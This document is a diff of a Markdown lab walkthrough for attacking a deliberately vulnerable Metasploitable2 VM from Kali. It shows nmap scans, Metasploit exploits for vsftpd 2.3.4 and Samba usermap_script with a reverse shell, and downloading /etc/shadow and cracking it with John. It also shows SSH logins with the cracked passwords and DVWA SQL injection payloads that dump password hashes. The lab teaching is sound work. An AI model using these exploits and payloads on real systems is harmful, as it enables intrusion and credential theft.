@@ -32,7 +32,7 @@ From there start each VM, authenticate(msfadmin, kali) and check for ```eth0``` 
 Reconnaissance referce to a process of preliminary investigating to gather information before performing an action. In our case, the logical question will pop up in an attacker's head: *what's there?*. It's crucial to know what you are attacking, before actually attacking. 
 
 From Kali run: 
-```bash
+```shell
 nmap -sn <target-ip>/24
 ```
 
@@ -40,7 +40,7 @@ nmap -sn <target-ip>/24
 
 Now port scan the target: 
 
-```bash
+```shell
 nmap -sV -sC -p- <target-ip> -oN nmap_full.txt
 ```
 Breaking that down: ```-sV``` does service/version detection (not just "port 21 is open" but "port 21 is running vsftpd 2.3.4"). ```-sC``` runs default safe scripts that probe for common issues. ```-p-``` scans all 65535 ports instead of just the top 1000. ```-oN``` saves output to a file. This will take a few minutes.
@@ -53,14 +53,14 @@ For each interesting service, the workflow is: get the version → look up known
 
 The classic tool is ```searchsploit``` (Exploit-DB's offline database, preinstalled on Kali):
 
-```bash 
+```shell 
 searchsploit vsftpd 2.3.4
 searchsploit samba 3.0.20
 searchsploit unrealircd 3.2.8.1
 ```
 For each one of these commands you will get different response with vulnerabilities listed. You will something like this for ```searchsploit vsftpd 2.3.4```: 
 
-```bash
+```shell
 vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/17491.rb
 vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
 ```
@@ -75,7 +75,7 @@ Now we will exploit each one of these vulnerabilities. We will start off with ``
 
 ### 4a - vsftpd 2.3.4 
 In Kali run:
-```bash 
+```shell 
 msfconsole
 search vsftpd
 use exploit/unix/ftp/vsftpd_234_backdoor
@@ -86,7 +86,7 @@ exploit
 ```
 
 Now we have gained access to ```meterpreter```, which basically means we now have a Unix command shell as **root.** To check that, run following commands: 
-```bash
+```shell
 shell
 whoami (The response should be root)
 ```
@@ -95,27 +95,27 @@ Now you can do a lot of interesting things, we will pull the passwords and crack
 
 In meterpreter run: 
 
-```bash
+```shell
 download /etc/passwd (pulls passwords)
 download /etc/shadow (pulls hashes)
 ```
 
 From another Kali terminal crack passwords
 
-```bash
+```shell
 unshadow /home/kali/passwd /home/kali/shadow > /home/kali/cracked.txt
 cat /home/kali/cracked.txt
 ```
 
 **cracked.txt** should be something like that: 
-```bash 
+```shell 
 root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
 msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
 ```
 
 Run John: 
 
-```bash
+```shell
 john /home/kali/cracked.txt
 
 OR if john is slow: 
@@ -128,25 +128,25 @@ john --wordlist=/usr/share/wordlists/rockyou.txt /root/cracked.txt
 ```
 
 It will take some time, but now we have passwords: 
-```bash
+```shell
 john --show /home/kali/cracked.txt
 ```
 
 Next step is to connect with SSH: 
-```bash
+```shell
 ssh msfadmin@<target-ip> // password: msfadmin 
 ssh postgres@<target-ip> // password: postgres
 ssh user@<target-ip> // password: user 
 ```
 
 Now we have SSH for almost every running service. You may also run into an error like this when running ```ssh``` commands:
-```bash
+```shell
 Unable to negotiate with <target-ip> on port 22: no matching host key type found.
 ```
 
 It is caused because Metaspoitable2 runs on 2010 OpenSSH server and Kali is on the new one. The **fix** would be to allow old OpenSSH algorithms.
 
-```bash
+```shell
 ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<target-ip>
 ```
 
@@ -155,7 +155,7 @@ ssh -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@<t
 Samba 3.0.20 had an option called ```username map script``` that, when configured, passed the username to a shell script. The bug: it didn't sanitize the username, so you could inject shell metacharacters and execute arbitrary commands as root before any authentication happened. This is a Command Injection. 
 
 In Kali (msfconsole) run: 
-```bash
+```shell
 search samba
 use exploit/multi/samba/usermap_script
 set RHOSTS <target-ip>
@@ -164,3 +164,34 @@ set LHOST <attacker-ip>
 exploit
 ```
 That gives you a reverse shell - the *target* connects back to you. This matters: if the target is behind NAT or a firewall blocking inbound, a reverse shell often works where a bind shell wouldn't.
+
+### 4c - DVWA 
+
+Metaspoitable hosts multiple vulnerable web apps. One of the exploitation tactics would be SQL Injection. From Kali go to http://target-ip/ and select DVWA. In ```DVWA Security``` section set Security Level to low. 
+
+SQL Injection allows to run SQL commands from client's input. In ```SQL Injection``` section you can type in User ID and app will return you user_id, first_name, last_name. Type in 1, 2 or 3. 
+
+Now the SQL query looks something like this:
+
+```sql
+SELECT * FROM users WHERE user_id = '$id'
+```
+
+But if you type in: 
+```sql 
+1' OR '1'='1
+```
+
+You will get all users. This is because with this command the final query becomes: 
+
+```sql 
+SELECT * FROM users WHERE user_id = '1' OR '1'='1'
+```
+
+To get all **password hashes** we input: 
+
+```sql 
+1' UNION SELECT user, password FROM users--
+```
+
+Crack them with ```john``` or ```hashcat```.
